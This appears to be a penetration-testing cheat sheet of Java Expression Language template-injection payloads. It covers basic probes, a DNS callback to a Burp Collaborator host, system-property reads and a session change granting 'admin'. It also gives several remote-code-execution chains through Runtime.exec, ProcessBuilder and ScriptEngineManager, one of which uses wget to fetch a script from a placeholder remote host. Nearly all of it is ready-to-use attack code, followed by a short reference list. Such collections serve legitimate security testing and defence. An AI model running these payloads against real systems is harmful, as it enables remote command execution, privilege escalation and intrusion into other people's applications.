# Server Side Template Injection - Expression Language

## Summary

- [Expression Language EL](#expression-language-el)
    - [Expression Language EL - Basic injection](#expression-language-el---basic-injection)
    - [Expression Language EL - One-Liner injections not including code execution](#expression-language-el---one-liner-injections-not-including-code-execution)
    - [Expression Language EL - Code Execution](#expression-language-el---code-execution)
- [References](#references)


## Expression Language EL

[Official website](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html)
> Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0

### Expression Language EL - Basic injection

```java
${<property>}
${1+1}

#{<expression string>}
#{1+1}

T(<javaclass>)
```

### Expression Language EL - Properties

* Interesting properties to access `String`, `java.lang.Runtime`

```ps1
${2.class}
${2.class.forName("java.lang.String")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}
```

### Expression Language EL - One-Liner injections not including code execution

```java
// DNS Lookup
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}

// JVM System Property Lookup (ex: java.class.path)
${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}

// Modify session attributes
${pageContext.request.getSession().setAttribute("admin",true)}
```

### Expression Language EL - Code Execution

```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using process builder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using JavaClass
T(java.lang.Runtime).getRuntime().exec('whoami').x

// Method using ScriptEngineManager
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
```


## References

- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
- [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)